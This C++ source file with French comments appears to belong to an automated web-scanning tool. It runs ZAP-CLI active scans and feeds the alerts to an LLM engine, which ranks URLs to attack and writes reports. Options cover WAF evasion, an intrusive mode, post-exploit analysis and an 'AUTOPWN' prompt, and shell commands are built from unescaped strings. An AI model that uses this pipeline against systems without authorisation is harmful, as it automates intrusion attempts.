            if (ReadFile(outRd, tmp, (DWORD)sizeof(tmp), &r, NULL) && r) {
                out_stdout.append(tmp, tmp + r);
                if (stream_to_console) { std::cout.write(tmp, r); std::cout.flush(); }
            } else break;
        }
        // stderr
        while (PeekNamedPipe(errRd, NULL, 0, NULL, &avail, NULL) && avail) {
            DWORD r = 0;
            if (ReadFile(errRd, tmp, (DWORD)sizeof(tmp), &r, NULL) && r) {
                out_stderr.append(tmp, tmp + r);
                if (stream_to_console) { std::cerr.write(tmp, r); std::cerr.flush(); }
            } else break;
        }

        DWORD wait = WaitForSingleObject(pi.hProcess, 100);
        if (wait == WAIT_OBJECT_0) break;

        if (timeout_ms != 0 && (GetTickCount() - start) > timeout_ms) {
            TerminateProcess(pi.hProcess, 1);
            break;
        }
    }

    // drain
    DWORD r = 0;
    while (ReadFile(outRd, tmp, (DWORD)sizeof(tmp), &r, NULL) && r) {
        out_stdout.append(tmp, tmp + r);
        if (stream_to_console) std::cout.write(tmp, r);
    }
    if (stream_to_console) std::cout.flush();

    r = 0;
    while (ReadFile(errRd, tmp, (DWORD)sizeof(tmp), &r, NULL) && r) {
        out_stderr.append(tmp, tmp + r);
        if (stream_to_console) std::cerr.write(tmp, r);
    }
    if (stream_to_console) std::cerr.flush();

    CloseHandle(outRd); CloseHandle(errRd);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    return true;

#else
    int out_pipe[2], err_pipe[2];
    if (pipe(out_pipe) == -1) return false;
    if (pipe(err_pipe) == -1) { close(out_pipe[0]); close(out_pipe[1]); return false; }

    pid_t pid = fork();
    if (pid < 0) {
        close(out_pipe[0]); close(out_pipe[1]);
        close(err_pipe[0]); close(err_pipe[1]);
        return false;
    }
    if (pid == 0) {
        // child
        // redirect stdout/stderr
        dup2(out_pipe[1], STDOUT_FILENO);
        dup2(err_pipe[1], STDERR_FILENO);
        close(out_pipe[0]); close(out_pipe[1]);
        close(err_pipe[0]); close(err_pipe[1]);

        // exec via /bin/sh -c "cmd"
        execl("/bin/sh", "sh", "-c", cmd.c_str(), (char*)nullptr);
        _exit(127);
    }

    // parent
    close(out_pipe[1]);
    close(err_pipe[1]);

    // set non-blocking
    int flags;
    flags = fcntl(out_pipe[0], F_GETFL, 0); fcntl(out_pipe[0], F_SETFL, flags | O_NONBLOCK);
    flags = fcntl(err_pipe[0], F_GETFL, 0); fcntl(err_pipe[0], F_SETFL, flags | O_NONBLOCK);

    auto start_tp = std::chrono::steady_clock::now();
    bool done = false;

    while (!done) {
        fd_set rfds;
        FD_ZERO(&rfds);
        int maxfd = -1;
        FD_SET(out_pipe[0], &rfds);
        if (out_pipe[0] > maxfd) maxfd = out_pipe[0];
        FD_SET(err_pipe[0], &rfds);
        if (err_pipe[0] > maxfd) maxfd = err_pipe[0];

        struct timeval tv;
        tv.tv_sec = 0;
        tv.tv_usec = 200 * 1000; // 200 ms

        int rv = select(maxfd + 1, &rfds, nullptr, nullptr, &tv);
        if (rv > 0) {
            char buf[4096];
            if (FD_ISSET(out_pipe[0], &rfds)) {
                ssize_t r = read(out_pipe[0], buf, sizeof(buf));
                if (r > 0) {
                    out_stdout.append(buf, buf + r);
                    if (stream_to_console) { std::cout.write(buf, r); std::cout.flush(); }
                }
            }
            if (FD_ISSET(err_pipe[0], &rfds)) {
                ssize_t r = read(err_pipe[0], buf, sizeof(buf));
                if (r > 0) {
                    out_stderr.append(buf, buf + r);
                    if (stream_to_console) { std::cerr.write(buf, r); std::cerr.flush(); }
                }
            }
        }

        // check child
        int status = 0;
        pid_t w = waitpid(pid, &status, WNOHANG);
        if (w == pid) {
            done = true;
        }

        // timeout
        if (timeout_ms != 0) {
            auto now = std::chrono::steady_clock::now();
            auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(now - start_tp).count();
            if (!done && (unsigned long)elapsed > timeout_ms) {
                kill(pid, SIGKILL);
                waitpid(pid, &status, 0);
                done = true;
            }
        }
    }

    // drain remaining data
    {
        char buf[4096];
        ssize_t r = 0;
        do {
            r = read(out_pipe[0], buf, sizeof(buf));
            if (r > 0) {
                out_stdout.append(buf, buf + r);
                if (stream_to_console) { std::cout.write(buf, r); }
            }
        } while (r > 0);
        if (stream_to_console) std::cout.flush();

        do {
            r = read(err_pipe[0], buf, sizeof(buf));
            if (r > 0) {
                out_stderr.append(buf, buf + r);
                if (stream_to_console) { std::cerr.write(buf, r); }
            }
        } while (r > 0);
        if (stream_to_console) std::cerr.flush();
    }

    close(out_pipe[0]);
    close(err_pipe[0]);
    return true;
#endif
}

// Petit helper pour afficher un header pendant l'exécution d'une commande
struct ScopedBanner {
    std::string title;
    explicit ScopedBanner(const std::string &t) : title(t) {
        print_header_box(title); // tu l'as déjà plus haut
    }
    ~ScopedBanner() {
        // On peut juste mettre une petite trace de fin ou rien
        std::cout << ansi::blue << "[DONE] " << ansi::sky
                  << title << ansi::reset << "\n";
    }
};

// Wrapper: exécute une commande, log stdout/stderr dans un fichier, et renvoie ok/ko
static bool run_command_logged(const std::string &cmd,
                               const fs::path    &workdir,
                               const std::string &log_filename,
                               unsigned long      timeout_ms = 0,
                               bool               stream_to_console = false)
{
    std::string out, err;
    bool ok = run_command_capture(cmd, out, err, timeout_ms, stream_to_console);

    try {
        fs::create_directories(workdir);
        fs::path logfile = workdir / log_filename;
        std::ofstream ofs(logfile, std::ios::binary);
        ofs << "CMD: " << cmd << "\n\n";
        if (!out.empty()) ofs << "STDOUT:\n" << out << "\n\n";
        if (!err.empty()) ofs << "STDERR:\n" << err << "\n";
    } catch (...) {
        // best effort, on ne plante pas si le log ne peut pas être écrit
    }

    if (!ok) {
        logerr("Command failed: " + cmd);
    }
    return ok;
}

// -----------------------------------------------------------------------------
// call_mcp_display_with_file / call_mcp_analyze / call_mcp_report_with_files
// (déclarations — implémentations complètes en Partie 2/2, inchangées côté logique,
// mais reposent sur run_command_capture ci-dessus pour la portabilité.)
// -----------------------------------------------------------------------------
static bool call_mcp_display_with_file(const fs::path &mcp_path, const fs::path &alerts_file, const fs::path &exe_parent, std::string &mcp_raw_out);
static bool call_mcp_analyze(const fs::path &mcp_path, const fs::path &alerts_json_path, const fs::path &out_urls_json, std::string &mcp_out);
static bool call_mcp_report_with_files(const fs::path &mcp_path,
                                       const fs::path &exe_parent,
                                       const std::vector<fs::path> &files_to_inject,
                                       const std::string &tpl_name,
                                       std::string &mcp_raw_out,
                                       const fs::path &html_out_path = fs::path());


// -----------------------------------------------------------------------------
// run_zapcli_ascan_progress (xplat, avec parsing progress: "progress: N%")
// -----------------------------------------------------------------------------
static bool run_zapcli_ascan_progress(const std::string &zapcli_path,
                                      const std::string &host, uint16_t port, const std::string &apikey,
                                      const std::string &baseurl, const fs::path &outdir,
                                      std::string &stdout_out, std::string &stderr_out)
{
#ifdef _WIN32
    std::ostringstream cmd;
    cmd << '"' << zapcli_path << '"'
        << " --host " << host
        << " --port " << port;
    if (!apikey.empty()) cmd << " --apikey \"" << apikey << '"';
    cmd << " --baseurl \"" << baseurl << '"'
        << " --action ascan"
        << " --outdir \"" << outdir.string() << '"';

    // on réutilise run_command_capture pour simplifier; on parse le flux en live
    // ici on stream_to_console=false pour capter et parser manuellement
    std::string out, err;
    bool ok = run_command_capture(cmd.str(), out, err, 0, false);
    stdout_out = out;
    stderr_out = err;

    // Parse progress increments dans 'out' et 'err'
    std::regex reProgress(R"(progress:\s*(\d+)%\s*)", std::regex_constants::icase);
    auto parse_and_render = [&](const std::string& s){
        std::sregex_iterator it(s.begin(), s.end(), reProgress), end;
        int last=-1;
        for (; it != end; ++it) {
            int p = std::stoi((*it)[1].str());
            if (p != last) { render_progress_percent(p); last = p; }
        }
        if (last < 100) render_progress_percent(100);
        std::cout << std::endl;
    };
    parse_and_render(stdout_out);
    parse_and_render(stderr_out);
    return ok;

#else
    // Sous POSIX, on veut du "live parsing".
    // Implémentation dédiée: on exécute le process via /bin/sh -c et on lit les pipes en boucle
    // pour extraire "progress: N%".
    int out_pipe[2], err_pipe[2];
    if (pipe(out_pipe) == -1) return false;
    if (pipe(err_pipe) == -1) { close(out_pipe[0]); close(out_pipe[1]); return false; }

    std::ostringstream cmdbuf;
    cmdbuf << '"' << zapcli_path << '"'
           << " --host " << host
           << " --port " << port;
    if (!apikey.empty()) cmdbuf << " --apikey \"" << apikey << '"';
    cmdbuf << " --baseurl \"" << baseurl << '"'
           << " --action ascan"
           << " --outdir \"" << outdir.string() << '"';
    const std::string cmd = cmdbuf.str();

    pid_t pid = fork();
    if (pid < 0) {
        close(out_pipe[0]); close(out_pipe[1]);
        close(err_pipe[0]); close(err_pipe[1]);
        return false;
    }
    if (pid == 0) {
        dup2(out_pipe[1], STDOUT_FILENO);
        dup2(err_pipe[1], STDERR_FILENO);
        close(out_pipe[0]); close(out_pipe[1]);
        close(err_pipe[0]); close(err_pipe[1]);
        execl("/bin/sh", "sh", "-c", cmd.c_str(), (char*)nullptr);
        _exit(127);
    }

    close(out_pipe[1]);
    close(err_pipe[1]);

    // non-blocking
    int flags;
    flags = fcntl(out_pipe[0], F_GETFL, 0); fcntl(out_pipe[0], F_SETFL, flags | O_NONBLOCK);
    flags = fcntl(err_pipe[0], F_GETFL, 0); fcntl(err_pipe[0], F_SETFL, flags | O_NONBLOCK);

    std::regex reProgress(R"(progress:\s*(\d+)%\s*)", std::regex_constants::icase);
    int lastShown = -1;

    auto scan_chunk = [&](const std::string& s){
        std::smatch m;
        std::string::const_iterator searchStart( s.cbegin() );
        while (std::regex_search(searchStart, s.cend(), m, reProgress)) {
            int p = std::stoi(m[1].str());
            if (p != lastShown) { render_progress_percent(p); lastShown = p; }
            searchStart = m.suffix().first;
        }
    };

    bool done = false;
    while (!done) {
        fd_set rfds;
        FD_ZERO(&rfds);
        int maxfd = -1;
        FD_SET(out_pipe[0], &rfds);
        if (out_pipe[0] > maxfd) maxfd = out_pipe[0];
        FD_SET(err_pipe[0], &rfds);
        if (err_pipe[0] > maxfd) maxfd = err_pipe[0];

        struct timeval tv; tv.tv_sec=0; tv.tv_usec=200*1000;
        int rv = select(maxfd+1, &rfds, nullptr, nullptr, &tv);

        if (rv > 0) {
            char buf[2048];
            if (FD_ISSET(out_pipe[0], &rfds)) {
                ssize_t r = read(out_pipe[0], buf, sizeof(buf));
                if (r > 0) {
                    stdout_out.append(buf, buf + r);
                    scan_chunk(std::string(buf, buf + r));
                }
            }
            if (FD_ISSET(err_pipe[0], &rfds)) {
                ssize_t r = read(err_pipe[0], buf, sizeof(buf));
                if (r > 0) {
                    stderr_out.append(buf, buf + r);
                    scan_chunk(std::string(buf, buf + r));
                }
            }
        }

        int status=0;
        pid_t w = waitpid(pid, &status, WNOHANG);
        if (w == pid) done = true;
    }

    // flush fin
    if (lastShown < 100) { render_progress_percent(100); }
    std::cout << std::endl;

    // drainer tout
    {
        char buf[2048];
        ssize_t r=0;
        while ((r = read(out_pipe[0], buf, sizeof(buf))) > 0) {
            stdout_out.append(buf, buf + r);
        }
        while ((r = read(err_pipe[0], buf, sizeof(buf))) > 0) {
            stderr_out.append(buf, buf + r);
        }
    }
    close(out_pipe[0]);
    close(err_pipe[0]);
    return true;
#endif
}

// -----------------------------------------------------------------------------
// call_mcp_display_with_file : injecte alerts JSON dans mon_prompt.txt puis MCP
// -----------------------------------------------------------------------------
static bool call_mcp_display_with_file(const fs::path &mcp_path,
                                       const fs::path &alerts_file,
                                       const fs::path &exe_parent,
                                       std::string &mcp_raw_out)
{
    fs::path tpl_path = exe_parent / "mon_prompt.txt";
    if (!fs::exists(tpl_path)) {
        logerr("call_mcp_display_with_file: mon_prompt.txt not found in " + exe_parent.string());
        return false;
    }
    std::string tpl;
    try {
        std::ifstream ifs(tpl_path.string(), std::ios::in | std::ios::binary);
        std::ostringstream ss; ss << ifs.rdbuf(); tpl = ss.str();
    } catch(...) {
        logerr("call_mcp_display_with_file: failed to read mon_prompt.txt");
        return false;
    }

    std::string alerts_content;
    try {
        std::ifstream af(alerts_file.string(), std::ios::in | std::ios::binary);
        std::ostringstream ss; ss << af.rdbuf(); alerts_content = ss.str();
    } catch(...) {
        logerr("call_mcp_display_with_file: failed to read alerts file: " + alerts_file.string());
        return false;
    }

    std::string final_prompt = tpl;
    const std::string placeholder = "{{ALERTS_JSON}}";
    size_t pos = final_prompt.find(placeholder);
    if (pos != std::string::npos) final_prompt.replace(pos, placeholder.length(), alerts_content);
    else {
        final_prompt += "\n\n----- BEGIN ALERTS_JSON (injected file) -----\n";
        final_prompt += alerts_content;
        final_prompt += "\n----- END ALERTS_JSON -----\n";
    }

    fs::path tmp_prompt = exe_parent / "mcp_display_tmp_prompt.txt";
    try {
        std::ofstream ofs(tmp_prompt, std::ios::binary);
        ofs << final_prompt;
        ofs.close();
    } catch (const std::exception &ex) {
        logerr(std::string("call_mcp_display_with_file: failed to write tmp prompt: ") + ex.what());
        return false;
    }

    fs::path mcp_log = exe_parent / "mcp_display_session.log";
    std::ostringstream cmd;
    cmd << '"' << mcp_path.string() << '"'
        << " --engine web"
        << " --log \"" << mcp_log.string() << "\""
        << " --chat-file \"" << tmp_prompt.string() << "\"";

    std::string out, err;
    bool ok = run_command_capture(cmd.str(), out, err, 180000, false);
    mcp_raw_out = out + "\n" + err;
    if (!ok) logerr("call_mcp_display_with_file: MCP process failed (see " + mcp_log.string() + ")");

    auto extract_text = [](const std::string &s)->std::string {
        size_t b = s.find("```");
        if (b != std::string::npos) {
            size_t e = s.find("```", b + 3);
            if (e != std::string::npos && e > b + 3) {
                std::string inside = s.substr(b + 3, e - (b + 3));
                if (!inside.empty() && inside[0] == '\n') inside.erase(0, 1);
                return inside;
            }
        }
        return s;
    };

    std::string shown = extract_text(mcp_raw_out);
    std::cout << "\n\n======= MCP OUTPUT (via mon_prompt.txt + injected alerts_filtered.json) =======\n";
    std::cout << shown << "\n";
    std::cout << "======= END MCP OUTPUT =======\n\n";

    try { fs::remove(tmp_prompt); } catch(...) {}
    return ok;
}

// -----------------------------------------------------------------------------
// call_mcp_analyze : construit un prompt temporaire avec alerts JSON -> JSON urls
// -----------------------------------------------------------------------------
static bool call_mcp_analyze(const fs::path &mcp_path,
                             const fs::path &alerts_json_path,
                             const fs::path &out_urls_json,
                             std::string &mcp_out)
{
    fs::path mcp_log = out_urls_json.parent_path() / "mcp_session.log";
    std::string alerts_content;
    try {
        std::ifstream ifs(alerts_json_path);
        std::ostringstream ss; ss << ifs.rdbuf();
        alerts_content = ss.str();
    } catch (...) {
        logerr("call_mcp_analyze: cannot read " + alerts_json_path.string());
        return false;
    }

    fs::path tmp_prompt = out_urls_json.parent_path() / "mcp_prompt.txt";
    {
        std::ofstream f(tmp_prompt);
        f << "Analyse ce contenu JSON issu de ZAP :\n\n";
        f << "----- BEGIN ALERTS_JSON -----\n";
        f << alerts_content;
        f << "\n----- END ALERTS_JSON -----\n\n";
        f << "Donne une liste priorisée d'URLs à scanner activement avec justification courte.\n";
        f << "Retourne UNIQUEMENT un JSON strict au format :\n";
        f << "{\"urls\":[{\"url\":\"<url>\",\"justification\":\"<texte court>\"}]}\n";
        f.close();
    }

    std::ostringstream cmd;
    cmd << '"' << mcp_path.string() << '"'
        << " --engine web"
        << " --log \"" << mcp_log.string() << "\""
        << " --chat-file \"" << tmp_prompt.string() << "\"";

    std::string o, e;
    bool ok = run_command_capture(cmd.str(), o, e, 180000, false);
    mcp_out = o + "\n" + e;
    if (!ok) {
        logerr("call_mcp_analyze: MCP process failed to start/finish");
        return false;
    }

    auto extract_json = [](const std::string &s) -> std::string {
        size_t b = s.find('{');
        size_t e = s.rfind('}');
        if (b == std::string::npos || e == std::string::npos || e < b) return {};
        return s.substr(b, e - b + 1);
    };

    std::string jtxt = extract_json(mcp_out);
    if (jtxt.empty()) {
        loginfo("MCP did not return JSON, saving raw output instead");
        fs::create_directories(out_urls_json.parent_path());
        std::ofstream ofs(out_urls_json);
        ofs << mcp_out;
        return true;
    }

    try {
        json j = json::parse(jtxt, nullptr, false);
        if (!j.is_discarded() && j.contains("urls") && j["urls"].is_array()) {
            fs::create_directories(out_urls_json.parent_path());
            std::ofstream ofs(out_urls_json);
            ofs << std::setw(2) << j;
            ofs.close();
        } else {
            logerr("MCP returned invalid JSON — saving raw output instead");
            std::ofstream ofs(out_urls_json);
            ofs << mcp_out;
        }
    } catch (const std::exception &ex) {
        logerr(std::string("JSON parse failed: ") + ex.what());
        std::ofstream ofs(out_urls_json);
        ofs << mcp_out;
    }

    return true;
}

// -----------------------------------------------------------------------------
// call_mcp_report_with_files : injecte plusieurs fichiers dans un template MCP
// -----------------------------------------------------------------------------
static bool call_mcp_report_with_files(const fs::path &mcp_path,
                                       const fs::path &exe_parent,
                                       const std::vector<fs::path> &files_to_inject,
                                       const std::string &tpl_name,
                                       std::string &mcp_raw_out,
                                       const fs::path &html_out_path)
{
    fs::path tpl_path = exe_parent / tpl_name;
    if (!fs::exists(tpl_path)) {
        logerr(std::string("call_mcp_report_with_files: template '") + tpl_name + "' not found in " + exe_parent.string());
        return false;
    }

    std::string tpl;
    try {
        std::ifstream ifs(tpl_path.string(), std::ios::in | std::ios::binary);
        std::ostringstream ss; ss << ifs.rdbuf();
        tpl = ss.str();
    } catch(...) {
        logerr("call_mcp_report_with_files: failed to read template");
        return false;
    }

    std::ostringstream injected;
    injected << "\n\n----- BEGIN INJECTED REPORT FILES -----\n";
    for (const auto &f : files_to_inject) {
        injected << "\n\n----- BEGIN FILE: " << f.filename().string() << " (path: " << f.string() << ") -----\n";
        std::string content;
        try {
            std::ifstream ifs(f.string(), std::ios::in | std::ios::binary);
            std::ostringstream ss; ss << ifs.rdbuf(); content = ss.str();
        } catch(...) {
            content = std::string("<< failed to read file: ") + f.string() + " >>\n";
        }
        injected << content << "\n";
        injected << "----- END FILE: " << f.filename().string() << " -----\n";
    }
    injected << "\n----- END INJECTED REPORT FILES -----\n\n";

    std::string final_prompt = tpl;
    const std::string placeholder = "{{REPORT_FILES}}";
    size_t pos = final_prompt.find(placeholder);
    if (pos != std::string::npos) final_prompt.replace(pos, placeholder.length(), injected.str());
    else final_prompt += "\n\n" + injected.str();

    fs::path tmp_prompt = exe_parent / "mcp_report_tmp_prompt.txt";
    try {
        std::ofstream ofs(tmp_prompt, std::ios::binary);
        ofs << final_prompt;
        ofs.close();
    } catch (const std::exception &ex) {
        logerr(std::string("call_mcp_report_with_files: failed to write tmp prompt: ") + ex.what());
        return false;
    }

    fs::path mcp_log = exe_parent / "mcp_report_session.log";
    std::ostringstream cmd;
    cmd << '"' << mcp_path.string() << '"'
        << " --engine web"
        << " --log \"" << mcp_log.string() << "\""
        << " --chat-file \"" << tmp_prompt.string() << "\"";

    std::string out, err;
    bool ok = run_command_capture(cmd.str(), out, err, 240000, false);
    mcp_raw_out = out + "\n" + err;
    if (!ok) logerr("call_mcp_report_with_files: MCP process failed (see " + mcp_log.string() + ")");

    if (!html_out_path.empty()) {
        try {
            fs::create_directories(html_out_path.parent_path());
            std::ofstream ofs(html_out_path, std::ios::binary);
            ofs << mcp_raw_out; // Écrit l'output tel quel (HTML attendu par le template)
            ofs.close();
        } catch (const std::exception &ex) {
            logerr(std::string("Failed to write HTML report: ") + ex.what());
            try { fs::remove(tmp_prompt); } catch(...) {}
            return false;
        }
        try { fs::remove(tmp_prompt); } catch(...) {}
        return ok;
    }

    // --- OPTION B: concatène uniquement les blocs ```...``` ; fallback => tout ---
    auto extract_all_codeblocks_or_all = [](const std::string &s)->std::string {
        std::string out;
        size_t pos = 0;
        bool any = false;
        while (true) {
            size_t b = s.find("```", pos);
            if (b == std::string::npos) break;
            size_t e = s.find("```", b + 3);
            if (e == std::string::npos) break;
            std::string block = s.substr(b + 3, e - (b + 3));
            if (!block.empty() && block[0] == '\n') block.erase(0,1);
            out += block;
            if (out.empty() || out.back() != '\n') out += "\n";
            pos = e + 3;
            any = true;
        }
        return any ? out : s;
    };

    std::string shown = extract_all_codeblocks_or_all(mcp_raw_out);
    std::cout << "\n\n======= REPORT OUTPUT =======\n";
    std::cout << shown << "\n";
    std::cout << "======= REPORT OUTPUT =======\n\n";

    try { fs::remove(tmp_prompt); } catch(...) {}
    return ok;
}

// -----------------------------------------------------------------------------
// run_zapcli : lance ZAP-CLI avec action, capte stdout/stderr (x-plat)
// -----------------------------------------------------------------------------
static bool run_zapcli(const std::string &zapcli_path,
                       const std::string &host, uint16_t port, const std::string &apikey,
                       const std::string &baseurl, const std::string &action,
                       const fs::path &outdir,
                       std::string &stdout_out, std::string &stderr_out)
{
    std::ostringstream cmd;
    cmd << '"' << zapcli_path << '"'
        << " --host " << host
        << " --port " << port;
    if (!apikey.empty()) cmd << " --apikey \"" << apikey << '"';
    if (!baseurl.empty()) cmd << " --baseurl \"" << baseurl << '"';
    if (!action.empty()) cmd << " --action " << action;
    if (!outdir.empty()) cmd << " --outdir \"" << outdir.string() << '"';

    std::string out, err;
    bool ok = run_command_capture(cmd.str(), out, err, 0, false); // pas d'écriture console
    stdout_out = out;
    stderr_out = err;
    if (!ok) logerr("run_zapcli failed to launch: " + cmd.str());
    return ok;
}

// -----------------------------------------------------------------------------
// ZAP advanced script specification (for login flows, header morphing, custom checks)
// Format CLI: --zap-script name:type:engine:path
// Example: --zap-script loginFlow:standalone:Zest:/zap/scripts/login_flow.zst
//          --zap-script headerMorph:httpsender:ECMAScript:/zap/scripts/header_morph.js
// -----------------------------------------------------------------------------
struct ZapScriptSpec {
    std::string name;
    std::string type;    // ZAP scriptType: standalone, httpsender, proxy, authentication, etc.
    std::string engine;  // e.g. "Zest", "ECMAScript", "Oracle Nashorn"
    std::string file;
    bool standalone = false; // if true => runStandAloneScript after load
};

// -----------------------------------------------------------------------------
// Structures & helpers additionnels (inchangés côté logique)
// -----------------------------------------------------------------------------
struct AgentOptions {
    std::string host="localhost";
    uint16_t    port=8888;
    std::string apikey;

    std::string baseurl;
    fs::path    outdir="zap_cli_out";
    fs::path    mcp_path;
    std::string zapcli_path = "ZAP-CLI"; // cross-platform défaut : sans extension
    bool        wait_browse=false;

    // ---------------- ZAP avancé: contextes, auth, scripts, tuning ----------------
    // Nom du contexte ZAP dans lequel on travaille (auth, users, etc.)
    std::string zap_context_name;

    // Chemin optionnel vers un fichier .context exporté depuis ZAP
    // (on l'importe au début via l'API /context/action/importContext)
    std::string zap_context_file;

    // Liste de users ZAP (multi-rôles) à utiliser pour spiderAsUser / scanAsUser.
    // Ils doivent exister dans le contexte zap_context_name.
    std::vector<std::string> zap_auth_users;

    // Focalisation des scans actifs authentifiés sur certains prefixes (/api, /admin, ...)
    std::vector<std::string> zap_focus_prefixes;

    // Nom de la policy d'active scan ZAP à utiliser (scanPolicyName)
    std::string zap_scan_policy;

    // Ajax spider (JS-heavy apps)
    bool zap_use_ajax_spider = false;

    // Proxy chain / Anti-WAF (ZAP upstream proxy)
    bool        zap_enable_proxy_chain = false;
    std::string zap_proxy_host;
    uint16_t    zap_proxy_port = 0;

    // Throttling simple entre scans actifs pour calmer les WAF
    bool zap_throttle_waf = false;
    int  zap_throttle_ms  = 0;

    // User-Agent par défaut (pour morphing simple)
    std::string zap_default_user_agent;

    // Scripts ZAP (Zest / JS / Groovy etc.) à charger/activer.
    // Cf. struct ZapScriptSpec + CLI --zap-script name:type:engine:path
    std::vector<ZapScriptSpec> zap_scripts;
    // Fichier de prompt externe pour le moteur MCP AUTOPWN Web/API
    fs::path mcp_autopwn_prompt_file;
};

// Trouver dernier fichier avec préfixe (non-recursif)
static fs::path find_latest_file_with_prefix(const fs::path &workdir, const std::string &prefix) {
    fs::path latest;
    fs::file_time_type latest_time;
    bool found = false;
    try {
        for (auto &p : fs::directory_iterator(workdir)) {
            if (!p.is_regular_file()) continue;
            std::string fname = p.path().filename().string();
            if (fname.rfind(prefix, 0) == 0) {
                fs::file_time_type t = fs::last_write_time(p.path());
                if (!found || t > latest_time) {
                    latest_time = t;
                    latest = p.path();
                    found = true;
                }
            }
        }
    } catch (const std::exception &ex) {
        logerr(std::string("find_latest_file_with_prefix: error scanning ") + workdir.string() + " : " + ex.what());
    }
    return latest;
}

// Trouver les fichiers active_alerts_*.json (non-recursif) — tri lexicographique
static std::vector<fs::path> find_message_files(const fs::path &workdir) {
    std::vector<fs::path> out;
    try {
        for (auto &p : fs::directory_iterator(workdir)) {
            if (!p.is_regular_file()) continue;
            std::string fname = p.path().filename().string();
            if (fname.rfind("active_alerts_", 0) == 0 && p.path().extension() == ".json") {
                out.push_back(p.path());
            }
        }
        std::sort(out.begin(), out.end(), [](const fs::path &a, const fs::path &b){
            return a.filename().string() < b.filename().string();
        });
    } catch (const std::exception &ex) {
        logerr(std::string("find_message_files: error scanning ") + workdir.string() + " : " + ex.what());
    }
    return out;
}

static void print_compact_alerts_summary(const json &alerts_json, const fs::path &workdir) {
    int informational = 0, low = 0, medium = 0, high = 0;
    if (alerts_json.contains("alerts") && alerts_json["alerts"].is_array()) {
        for (const auto &a : alerts_json["alerts"]) {
            std::string r = a.value("risk", "");
            if (r == "Informational") informational++;
            else if (r == "Low") low++;
            else if (r == "Medium") medium++;
            else if (r == "High") high++;
        }
    }

    std::cout << ansi::green << "[+] Generate scan session..." << ansi::reset << std::endl;

    const int w1 = 15, w2 = 7, w3 = 8, w4 = 7;
    const int inner = w1 + w2 + w3 + w4 + 11;

    auto B = [](){ return ansi::blue;  };
    auto W = [](){ return ansi::white; };
    auto R = [](){ return ansi::reset; };

    // top border
    std::cout << B() << u8"┌" << utf8_repeat(u8"─", inner) << u8"┐" << R() << "\n";

    // title
    const std::string title_s = " Alerts summary";
    const int title_pad = inner - static_cast<int>(title_s.size());
    std::cout << B() << u8"│ " << W() << title_s << std::string(title_pad - 1, ' ')
              << B() << u8"│" << R() << "\n";

    // separator
    std::cout << B() << u8"├" << utf8_repeat(u8"─", w1+2) << u8"┬"
              << utf8_repeat(u8"─", w2+2) << u8"┬"
              << utf8_repeat(u8"─", w3+2) << u8"┬"
              << utf8_repeat(u8"─", w4+2) << u8"┤" << R() << "\n";

    auto pad_center = [](const std::string &s, int w)->std::string {
        if ((int)s.size() >= w) return s.substr(0, w);
        int left  = (w - (int)s.size()) / 2;
        int right = w - (int)s.size() - left;
        return std::string(left, ' ') + s + std::string(right, ' ');
    };

    // header row
    std::cout << B() << u8"│ " << W() << pad_center("Informational", w1)
              << B() << u8" │ " << ansi::yellow << pad_center("Low", w2) << R()
              << B() << u8" │ " << ansi::orange << pad_center("Medium", w3) << R()
              << B() << u8" │ " << ansi::red << pad_center("High", w4) << R()
              << B() << u8" │" << R() << "\n";

    // separator
    std::cout << B() << u8"├" << utf8_repeat(u8"─", w1+2) << u8"┼"
              << utf8_repeat(u8"─", w2+2) << u8"┼"
              << utf8_repeat(u8"─", w3+2) << u8"┼"
              << utf8_repeat(u8"─", w4+2) << u8"┤" << R() << "\n";

    auto pad_right = [](const std::string &s, int w)->std::string {
        if ((int)s.size() >= w) return s.substr(0, w);
        return s + std::string(w - (int)s.size(), ' ');
    };

    // values row
    std::cout << B() << u8"│ " << W() << pad_right(std::to_string(informational), w1)
              << B() << u8" │ " << ansi::yellow << pad_right(std::to_string(low), w2) << R()
              << B() << u8" │ " << ansi::orange << pad_right(std::to_string(medium), w3) << R()
              << B() << u8" │ " << ansi::red << pad_right(std::to_string(high), w4) << R()
              << B() << u8" │" << R() << "\n";

    // bottom border
    std::cout << B() << u8"└" << utf8_repeat(u8"─", w1+2) << u8"┴"
              << utf8_repeat(u8"─", w2+2) << u8"┴"
              << utf8_repeat(u8"─", w3+2) << u8"┴"
              << utf8_repeat(u8"─", w4+2) << u8"┘" << R() << "\n";

    // messages finaux
    std::cout << ansi::green << "[+] All done. Output directory: "
              << ansi::white << workdir.string()
              << ansi::reset << std::endl;

    std::cout << ansi::green << "[+] Strategy report generation..."
              << ansi::reset << std::endl;
}

// -----------------------------------------------------------------------------
// K8s helpers (cross-platform)
// -----------------------------------------------------------------------------
static std::string g_kubecontext;  // optionnel
static std::string g_kubeconfig;   // optionnel
static fs::path    g_kube_dir="kube";

// ===== Katana global state (piloté par main() / CLI) =====
static bool g_use_katana = false;                         // --katana
static std::string g_katana_bin_explicit;                 // --katana-bin <path>
static std::vector<std::string> g_katana_passthrough;     // tout ce qui suit -- (pass-through)
static bool g_intrusive_mode = false; // activé par --intrusive



static std::string quote(const std::string& s){
    std::ostringstream o; o << '"' << s << '"'; return o.str();
}
static std::string join_cmd(const std::string& exe, const std::vector<std::string>& args){
    std::ostringstream cmd; cmd << exe;
    for (auto& a: args) { cmd << ' ' << a; }
    return cmd.str();
}

// Forward declaration : used by ZAP helpers and flows that are defined earlier
static std::string url_encode(const std::string& s);

// Edge / CDN / Proxy / Monitoring / Flow orchestration
struct ConfirmationCommand; // forward decl pour les prototypes Edge
static nlohmann::json harvest_edge_triggers(const std::string& baseurl, const fs::path& workdir);
static void append_edge_flows(const std::string& baseurl, const fs::path& workdir,
                              std::vector<ConfirmationCommand>& plan, nlohmann::json& plan_json);
static void analyse_postexploit_results_edge(const std::string& baseurl, const fs::path& workdir);


// Résout un binaire local si présent :
// - Windows: teste "name.exe" dans g_kube_dir, sinon "name" via PATH
// - POSIX: teste "name" dans g_kube_dir, sinon "name" via PATH
// Avant : resolve_cmd renvoyait un chemin déjà entre guillemets -> à éviter
// Après : renvoie toujours un chemin SANS guillemets
static std::string resolve_cmd(const std::string& prefer_basename, const std::string& fallback_name){
#ifdef _WIN32
    fs::path p1 = g_kube_dir / (prefer_basename + ".exe");
    if (fs::exists(p1)) return p1.string();
    fs::path p2 = g_kube_dir / prefer_basename;
    if (fs::exists(p2)) return p2.string();
    return fallback_name; // via PATH
#else
    fs::path p1 = g_kube_dir / prefer_basename;
    if (fs::exists(p1)) return p1.string();
    return fallback_name; // via PATH
#endif
